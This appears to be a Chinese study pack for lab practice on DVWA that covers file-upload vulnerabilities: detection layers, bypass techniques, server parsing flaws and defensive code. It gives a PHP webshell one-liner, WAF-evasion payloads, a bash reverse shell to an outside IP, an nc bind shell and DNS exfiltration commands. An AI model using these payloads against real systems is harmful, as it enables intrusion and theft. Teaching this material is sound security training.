# 11/18 资料包：文件上传（深度版）

> 难度说明：这份不比之前，不给你清单，给你推导方法。
> 白天要做的不是抄，是**写假设**；晚上验证假设，记录对错。
> 目标不是"知道五种绕过"，是"面对一个从没见过的上传点，能推出该怎么试"。

---

## 第 0 章：一个上传请求，字节级长什么样

先看浏览器发出去的原始请求。这段你要能背出结构。

```
POST /upload.php HTTP/1.1
Host: 192.168.36.129:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 342

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

\xff\xd8\xff\xe0\x00\x10JFIF ...（这里是真实的 JPEG 字节）
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### 拆开看，一共四个可变点

| 位置 | 例子 | 能不能伪造 |
|---|---|---|
| `boundary` | `----WebKitFormBoundary7MA4...` | 能，随便改，只要前后一致 |
| `filename` | `test.jpg` | **能，这是最容易改的** |
| `Content-Type`（段内那个） | `image/jpeg` | **能，跟文件真实内容无关** |
| 文件内容 | JPEG 字节 | 能，但改了就变成本质不同的东西 |

### 关键认知

**`filename` 和段内的 `Content-Type` 都是客户端随便写的字符串。**

服务器如果只信这两样，那它信的全是攻击者的话。

真实文件类型只能靠**读文件内容**判断（magic bytes），而这一步很多应用根本不做好。

---

## 第 1 章：从浏览器到磁盘，七个环节

一次上传，数据要经过七个环节。**每个环节都是一层可能的检测点，也是一层可能的绕过点。**

```
① 浏览器/前端 JS ──→ ② HTTP 请求 ──→ ③ Web 服务器（Apache/Nginx）
                                            ↓
④ 应用代码（PHP/Python）──→ ⑤ 存储（磁盘/对象存储）
                                            ↓
⑥ 重命名/权限 ──→ ⑦ 后续访问（URL 能否执行）
```

### 每一环的攻防

| 环节 | 常见检测 | 一句话绕过思路 |
|---|---|---|
| ① 前端 | JS 判断后缀、`accept="image/*"` | 改 JS / 直接构造请求，前端从不算数 |
| ② 传输 | WAF 看 Content-Type、看内容 | 改 Content-Type；编码；分块传输 |
| ③ 服务器 | `LimitRequestBody`、`mod_security` | 看规则，改 payload 形态 |
| ④ 应用 | 后缀、MIME、magic、二次渲染 | **主战场，后面细讲** |
| ⑤ 存储 | 随机文件名、存到不可执行目录 | 竞争条件；结合 LFI；路径穿越 |
| ⑥ 命名 | 后缀白名单 | `.htaccess`；服务器解析漏洞 |
| ⑦ 访问 | 目录禁执行 | 跨目录；包含；SSRF |

**记住这张表的意义：** 你在 DVWA 里试的那些，只覆盖了 ④ 和 ⑥。真实环境里 ③ 和 ⑦ 才是难啃的。

---

## 第 2 章：七层检测，逐个推导

> 每一层我给你三段：**检测原理 / 绕过假设 / 怎么验证**。
> 白天你要做的是自己写出「绕过假设」，晚上验证。

### 第 1 层：前端 JS 校验

**原理：** 页面里 `onsubmit` 判断 `file.name` 的后缀，不是图片就 `return false`。

**特征：** 页面上传了非图片，一闪就提示"只能传图片"，**但 HTTP history 里根本没有请求**。

**绕过假设（你要自己写）：**
- 关掉 JS
- Burp 拦截后修改再放行
- 把文件改名成 `.jpg` 传上去，内容还是 php
- 直接 Repeater 构造请求

**验证：** 看 HTTP history 有没有出现那次 POST。

**结论字段：** 前端校验存在吗？绕过方式是什么？

---

### 第 2 层：后缀黑名单

**原理：** 代码里有个数组 `["php", "php3", "php4", "jsp", "asp"]`，命中就拒。

**根本缺陷：** 黑名单永远列不全。你不知道执行环境支持哪些后缀。

**绕过假设：**

| 思路 | 具体后缀 | 前提 |
|---|---|---|
| 冷门 PHP 后缀 | `.php5` `.phtml` `.phar` `.pht` `.phps` | 服务器把该后缀交给 PHP 处理 |
| 大小写 | `.PHP` `.PhP` | 黑名单区分大小写，但文件系统/解析不区分 |
| 点号变体 | `.php.` `.php::$DATA` `.php. .` | Windows 会去掉末尾点号和空格 |
| 双写 | `.pphphp` | 代码只替换一次 `php` → 剩 `.php` |
| 编码 | `%2ephp`（不做二次解码则无效） | 取决于在哪一层解码 |
| 空字节 | `.php%00.jpg` | PHP < 5.3.4 |

**验证方法：** 传上去后访问文件 URL，看返回的是源码还是执行结果。

**怎么判断执行了：** 页面返回内容里没有 `<?php` 字样，而是你 php 代码的输出。

---

### 第 3 层：后缀白名单

**原理：** 只允许 `["jpg","png","gif"]`，白名单比黑名单安全。

**绕过思路转向：不再改名，改"服务器怎么解释这个文件"。**

**假设 A：多后缀解析**

Apache 的 `AddHandler` 会检查文件名里**所有**的扩展名（按点分割）：

```
shell.php.jpg   ← 只要 配置文件里有 AddHandler ... .php，这个文件就会被当 PHP 执行
```

而白名单只检查最后一个 `.jpg`，通过。

**假设 B：`.htaccess`**

如果允许上传 `.htaccess`（很多白名单漏掉它，因为觉得"不是可执行文件"），传一个：

```apache
AddType application/x-httpd-php .jpg
```

之后所有 `.jpg` 都当 PHP 执行。**这是把白名单彻底废掉的一招。**

**假设 C：服务器解析漏洞**（见第 3 章专讲）

**假设 D：上传目录可写但不可执行 → 结合 LFI**

上传一个带 PHP 代码的 `shell.jpg`，然后用文件包含漏洞去包含它：

```
?page=../../uploads/shell.jpg
```

即使目录禁执行，包含依然会解析其中的 PHP。

---

### 第 4 层：MIME 类型检测

**原理：** 检查段内的 `Content-Type: image/jpeg`。

**根本缺陷：** 这个字段是客户端写的，跟文件内容零关系。

**绕过：** Burp 里把那一行改成 `image/jpeg` 或 `image/png`。

**变体：** 有些代码检查 `$_FILES['file']['type']`，而这个值本身就来自客户端，天生可伪造。

**验证：** 传 php 文件 + 改 Content-Type，看是否通过。

---

### 第 5 层：文件头（magic bytes）检测

**原理：** 读文件前几个字节，判断是不是真图片。

| 格式 | magic bytes |
|---|---|
| GIF | `GIF89a` 或 `GIF87a` |
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |

**绕过：** 文件开头塞 6 个字节 `GIF89a`，后面接 php：

```
GIF89a<?php system($_GET['c']); ?>
```

文件头检测通过（看到 GIF89a），但服务器执行时整个文件当 PHP 解析，`GIF89a` 会被当成输出文本，不影响后面的代码。

**更强的变体：图片马。**

```bash
# Linux
cat 1.jpg shell.php > shell.jpg
# Windows
copy /b 1.jpg+shell.php shell.jpg
```

这不是拼接技巧，是**真实数据嵌入**：一张能正常打开的图片，尾部多了一段 php 代码。

**什么时候需要它：** 当检测不只读文件头，还试图解析整个文件时。

---

### 第 6 层：图像二次渲染

**原理：** 最狠的一层。服务器收到图片后，**用图像库重新编码一次**（GD / ImageMagick / PIL），然后存处理后的版本。

这意味着：你塞进文件尾部的 php 代码会被彻底丢弃，图片马失效。

**这是目前最有效的防护之一。**

**绕过思路（这是本题真正的难点）：**

二次渲染不是无损的，它保留的是"图像语义"，丢弃的是"多余的字节"。所以攻击点变成：

> 找出重新编码后**仍然会保留**的数据区域，把 payload 放进去。

具体方向（给你四个，自己去验证哪个在 DVWA/真实 CMS 上有效）：

| 格式 | 保留区域 | 思路 |
|---|---|---|
| GIF | 调色板、注释块 | 把 payload 塞进注释扩展块 |
| PNG | `IDAT` 之前/之后的 `tEXt` 块 | 塞进元数据 |
| JPEG | EXIF 段 | 塞进注释段 |
| 通用 | 图像尺寸极大时可能跳过重渲染 | 超过处理阈值的图可能被原样保存 |

**验证方法：** 上传 → 从服务器下载渲染后的文件 → 用 `xxd` / Hex 查看 payload 还在不在。

**这一层必须动手，光看资料没用。**

---

### 第 7 层：WAF / 内容检测

**原理：** 规则匹配危险字符串：`<?php`、`system(`、`eval(`、`base64_decode`、`assert`。

**绕过假设（从易到难）：**

| 思路 | payload | 说明 |
|---|---|---|
| 短标签 | `<?= \`whoami\` ?>` | 有些规则只查 `<?php` |
| 大小写 | `<?PHP` | 正则没加 `i` |
| 拼接 | `<?php $a="sys"."tem"; $a($_GET[1]);` | 字符串被拆开 |
| 变形函数 | `$f="system";$f(...)` | 变量函数 |
| 编码 | `eval(base64_decode("..."));` | 载荷不可见 |
| 无字母 | `$_=[]...[_.]**...` 之类 | 需 PHP 7 特定构造 |
| 换行拆分 | `<?ph\np system(...)` | 某些多行规则失效 |
| 分块传输 | `Transfer-Encoding: chunked` | WAF 不重组分块时失效 |

**注意：** 这一层是 DVWA Low 里试不到的（DVWA 没有 WAF）。你们实验室的 `8088` 那台 ModSecurity 才是练这个的地方。

---

## 第 3 章：服务器解析漏洞专题（白名单的真正杀手）

这一章是「绕过白名单」的核心，也是面试高频。

### 3.1 Apache 多后缀解析

**条件：** 用了 `AddHandler` 或 `AddType`（mod_php 时代常见）

**效果：** `shell.php.jpg` → 被当 PHP 执行

**原因：** Apache 拿 `filename` 按 `.` 切成多段，只要有任意一段匹配 handler，就交给 PHP。

**注意：** `SetHandler` 和 `ProxyPassMatch` 的行为不同；新版 Apache 2.4 + PHP-FPM 通常已不这样。

### 3.2 Apache 罕见后缀

配置文件里 `AddHandler application/x-httpd-php .php .phtml .php5`，那这三个都能执行。

`/etc/apache2/mods-enabled/php*.conf` 里能看到实际配置。

### 3.3 Nginx 畸形解析

**条件：** `cgi.fix_pathinfo=1`（老版本 PHP 默认）

**效果：**

```
/upload/shell.jpg/x.php
```

Nginx 找不到 `x.php`，把请求交给 PHP；PHP 按 `fix_pathinfo` 规则往前找真实存在的文件 `shell.jpg` 执行。

**本质：** Nginx 和 PHP 对「哪个是脚本文件」理解不一致。**这类"两套组件理解不一致"是漏洞的富矿。**

### 3.4 IIS6 分号解析

```
shell.asp;.jpg
```

IIS6 把分号当路径参数分隔，实际执行 `shell.asp`。

### 3.5 Windows 特性

| 特性 | 利用 |
|---|---|
| 末尾点号被忽略 | `shell.php.` → `shell.php` |
| 末尾空格被忽略 | `shell.php ` → `shell.php` |
| `::$DATA` | `shell.php::$DATA` → 当 `shell.php` |
| 短文件名 | `SHELL~1.PHP` |

---

## 第 4 章：上传之后干什么

上传成功只是拿到入口，不是终点。

```
传上去 → 能访问 → 能执行 → 能反弹 shell → 提权 → 横向
```

### 4.1 先确认执行，不要急着反弹

最省事的验证：传一个 `<?php echo "PWNED"; ?>`，访问 URL 看有没有 `PWNED`。

**为什么要先 echo：** 反弹 shell 失败的可能原因太多（防火墙、端口、出网限制），先确认"代码能跑"能排除一半变量。

### 4.2 反弹 vs 正向

| 方式 | 命令示例 | 适用 |
|---|---|---|
| 反弹 | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` | 目标能出网 |
| 正向 | `nc -lvp 4444 -e /bin/bash` | 目标不出网，但你能连进去 |
| 静默 | 写入 SSH key / crontab | 不需要交互 |

### 4.3 无回显怎么办

靶场里 echo 就能看到，真实环境经常不行。备选：

- 写文件：`file_put_contents('/var/www/html/x.txt', 'test')`
- DNS 外带：`nslookup $(whoami).dnslog.cn`
- 时间盲：`sleep 5`

### 4.4 上传目录禁执行怎么办

| 情况 | 办法 |
|---|---|
| 目录禁执行 | 结合 LFI 包含；或找同域其他可执行目录 |
| 存到对象存储 | 上传 HTML/SVG → 存储型 XSS；配合 CDN 缓存投毒 |
| 文件名随机 | 竞争条件；或从响应里读回文件名 |

---

## 第 5 章：防御怎么写（一个能过面试的答案）

按层次讲，不要只说"检查后缀"。

**1. 不要用黑名单，用白名单**，且白名单校验的是**服务端重新生成的名字**，不是用户给的名字。

```python
import uuid
ext = os.path.splitext(filename)[1].lower()
if ext not in {".jpg", ".png", ".gif"}:
    reject()
new_name = f"{uuid.uuid4().hex}{ext}"   # 用户给的名字完全丢弃
```

**2. 同时校验内容**

```python
from PIL import Image
im = Image.open(path)
im.verify()                     # 打不开的直接拒
if im.format not in {"JPEG", "PNG", "GIF"}:
    reject()
```

**3. 二次渲染**（最强）

```python
im = Image.open(path)
im.convert("RGB").save(new_path, format=im.format)   # 多余字节全部丢弃
```

**4. 存储和执行分离**

- 上传目录**禁止执行**：`php_admin_flag engine off`、Nginx 里 `location ~* /uploads/.*\.php$ { deny all; }`
- 更重要：**存到对象存储/CDN**，域名和主站分开。这样即使传了 HTML，也影响不到主站 cookie。

**5. 其他**

- `Content-Type` 由服务端重新生成，不信客户端
- 限制大小、限制数量、按用户隔离目录
- 文件名过滤 `../`、`;`、`::`、`%00`
- 上传接口加 CSRF token，防止被挂马

**面试答题模板：**

> 白名单定类型 → 重命名去掉用户控制 → 内容校验（解析库尝试验证）→ 二次渲染 → 存到不可执行且不同源的存储 → 访问层加防解析配置。

---

## 第 6 章：白天推演任务（这才是重点）

> 白天不抄资料，做下面四件事。每件写一两行，写在纸上。

### 任务 1：写出上传请求的骨架（不看资料）

凭记忆写出一个 multipart 上传请求的四个部分。写不出来的地方，晚上回来看第 0 章。

### 任务 2：给每一层写"绕过假设"

七层检测，每层写一句你会怎么试。**只写假设，不写答案**——答案在第 2 章，写完再对照。

示例格式：

```
第 3 层 白名单 —— 假设：改用 shell.php.jpg，看服务器是否按 php 解析
第 6 层 二次渲染 —— 假设：把 payload 塞进 PNG 的 tEXt 块，看渲染后是否保留
```

### 任务 3：画一条完整的攻击链

从「发现上传点」到「拿到 shell」，写出至少 6 步，每步标注「要验证什么」。

### 任务 4：写防御清单

不看第 5 章，自己写五条。写完再对照，看你漏了哪条。

---

## 第 7 章：晚上的验证清单

> 在 DVWA 上把难度从 Low 逐步往上调，每调一档，看哪些绕过失效。

### 记录表（每个都要填）

| # | 检测层 | 我用的 payload | Low 结果 | Medium 结果 | High 结果 | 结论 |
|---|---|---|---|---|---|---|
| 1 | 前端 JS | | | | | |
| 2 | 后缀黑名单 | `.php5` | | | | |
| 3 | 后缀黑名单 | `.PHP` | | | | |
| 4 | 后缀黑名单 | `.pphphp` | | | | |
| 5 | 后缀黑名单 | `.php.` | | | | |
| 6 | 后缀黑名单 | `.php%00.jpg` | | | | |
| 7 | MIME | 改 Content-Type | | | | |
| 8 | magic | `GIF89a` + php | | | | |
| 9 | 二次渲染 | 图像马 / EXIF | | | | |
| 10 | 白名单 | `.htaccess` | | | | |
| 11 | 白名单 | `shell.php.jpg` | | | | |

**每格填：通过 / 被拒 / 报错信息原文。**

---

## 第 8 章：生词表（20 个，抄在代码旁）

| 单词 | 意思 |
|---|---|
| `upload` | 上传 |
| `multipart` | 多部分（表单的一种编码） |
| `boundary` | 分隔边界 |
| `Content-Disposition` | 内容处置（说明这段是什么） |
| `attachment` / `inline` | 附件 / 内联显示 |
| `MIME type` | 媒体类型，如 `image/png` |
| `magic bytes` | 文件头魔数 |
| `extension` | 扩展名 |
| `whitelist` / `blacklist` | 白名单 / 黑名单 |
| `sanitize` | 净化（清洗输入） |
| `validate` | 校验 |
| `render` | 渲染 |
| `re-encode` | 重新编码 |
| `exploit` | 利用（名词）/ 利用（动词） |
| `payload` | 载荷 |
| `webshell` | 网页后门 |
| `reverse shell` | 反弹 shell |
| `restrict` / `deny` | 限制 / 拒绝 |
| `chunked` | 分块传输 |
| `bypass` | 绕过 |

---

## 第 9 章：自测（晚上做，五道）

1. 为什么 `Content-Type` 这个字段永远不能信？
2. 白名单比黑名单安全，但它防不住哪一类攻击？（答出两个）
3. `.htaccess` 为什么能废掉白名单？
4. 二次渲染为什么是最强防护？它的绕过思路是什么方向？
5. Nginx 畸形解析的根因，用一句话说清楚是什么"不一致"？

---

## 附：DVWA 难度对应的检测

| 难度 | 开了什么检测 | 哪条绕过还有效 |
|---|---|---|
| Low | 无 | 全部 |
| Medium | 后缀 + MIME + 大小限制 | 改后缀到白名单外 + 改 MIME |
| High | 后缀白名单 + `getimagesize` | 图像马 / 二次渲染绕过 |
| Impossible | 全 + 重命名 + 随机 + 严格白名单 | 基本无解（这是设计目标） |

**注意：** Impossible 级别不是"你不够强"，是"这个场景本来就没有解"。能说清为什么无解，比硬凑一个 payload 更有价值。
